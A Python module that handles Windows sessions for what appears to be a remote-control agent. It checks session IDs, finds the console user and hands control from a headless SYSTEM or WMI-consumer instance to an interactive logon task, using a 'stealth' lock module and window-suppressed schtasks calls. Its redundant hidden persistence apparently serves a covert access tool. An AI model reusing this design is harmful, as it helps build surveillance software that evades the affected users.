"""Windows session awareness.

A WMI consumer and the ``/RU SYSTEM`` boot task both land in session 0, where
there is no interactive desktop: no screen capture, no input injection, no
foreground window. The interactive ONLOGON task is the only vector that has a
desktop.

So: a headless agent hands over to the interactive task as soon as a user logs
on, and the watchdog is the single place that decides *which* tier should be
running. Exactly one agent exists at a time; it is the interactive one whenever
a user is present.
"""

from __future__ import annotations

import ctypes
import os
import subprocess
import time

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0

_CONSOLE_NONE = 0xFFFFFFFF
WTS_CURRENT_SERVER_HANDLE = 0
WTS_USERNAME = 5


def session_of(pid: int) -> int:
    """Session id owning ``pid``; -1 when unknown."""
    if not IS_WINDOWS:
        return -1
    try:
        value = ctypes.c_ulong(0)
        ok = ctypes.windll.kernel32.ProcessIdToSessionId(
            ctypes.c_ulong(pid), ctypes.byref(value))
        return int(value.value) if ok else -1
    except Exception:
        return -1


def current_session() -> int:
    return session_of(os.getpid())


def is_headless() -> bool:
    """True when this process has no interactive desktop."""
    if not IS_WINDOWS:
        return False
    session = current_session()
    return session == 0


def console_session() -> int:
    """Session id of the physical console, or 0 when nobody is logged on."""
    if not IS_WINDOWS:
        return 1
    try:
        value = ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
        return int(value) if value != _CONSOLE_NONE else 0
    except Exception:
        return 0


def user_session_active() -> bool:
    """True when a human is logged on at the console."""
    if not IS_WINDOWS:
        return True
    return console_session() > 0


def console_user() -> str:
    """User name of the console session, or '' when unknown."""
    if not IS_WINDOWS:
        return os.environ.get("USER", "")
    session = console_session()
    if session <= 0:
        return ""
    buffer = ctypes.c_wchar_p()
    returned = ctypes.c_ulong(0)
    try:
        ok = ctypes.windll.wtsapi32.WTSQuerySessionInformationW(
            WTS_CURRENT_SERVER_HANDLE, session, WTS_USERNAME,
            ctypes.byref(buffer), ctypes.byref(returned))
        if not ok or not buffer.value:
            return ""
        return str(buffer.value)
    except Exception:
        return ""
    finally:
        try:
            ctypes.windll.wtsapi32.WTSFreeMemory(buffer)
        except Exception:
            pass


def task_exists(name: str) -> bool:
    if not IS_WINDOWS:
        return False
    try:
        from .. import config
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", name],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        return result.returncode == 0
    except Exception:
        return False


def run_task(name: str) -> bool:
    if not IS_WINDOWS:
        return False
    try:
        result = subprocess.run(
            ["schtasks", "/Run", "/TN", name],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20)
        return result.returncode == 0
    except Exception:
        return False


def should_yield() -> bool:
    """A headless agent with a logged-on user and a live logon task: yield."""
    if not IS_WINDOWS or not is_headless():
        return False
    if os.environ.get("SYSPY_NO_YIELD") == "1":
        return False
    if not user_session_active():
        return False
    from .. import config
    return task_exists(config.TASK_NAME)


def yield_to_interactive(wait: float = 20.0) -> bool:
    """Ask the interactive task to take over. True when it did."""
    from .. import config
    if not run_task(config.TASK_NAME):
        return False
    deadline = time.time() + wait
    while time.time() < deadline:
        time.sleep(0.5)
        try:
            from . import stealth
            owner = stealth.read_pid(stealth.lock_path())
            if owner and owner != os.getpid() and stealth.process_alive(owner):
                if session_of(owner) > 0:
                    return True
        except Exception:
            pass
    return False
